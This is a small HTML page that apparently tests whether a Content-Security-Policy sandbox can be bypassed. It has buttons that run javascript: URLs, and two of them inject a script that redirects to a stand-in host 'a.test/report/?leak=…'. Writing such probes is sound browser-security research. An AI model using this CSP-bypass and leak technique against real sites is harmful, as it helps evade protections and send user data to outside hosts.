<html>
<head>
    <meta http-equiv='Content-Security-Policy' content='sandbox allow-scripts allow-same-origin'>
</head>
<body>
    <button onclick='normal()'>normal</button>
    <br/>
    <button onclick='bypass()'>bypass</button>
    <br/>
    <button onclick='notbypass()'>inFrame</button>
    <iframe id='myFrame'></iframe>
    <script>
        function normal() {
            location.href="javascript:alert()";
        }
        function bypass() {
            location.href = "javascript:'<script>document.location.href=\"https://a.test/report/?leak=c1180759\";<\/script>'";
        }
        function notbypass() {
            document.getElementById('myFrame').src = "javascript:'<script>document.location.href=\"https://a.test/report/?leak=c1180759\";<\/script>'";
        }
    </script>
</body>
</html>
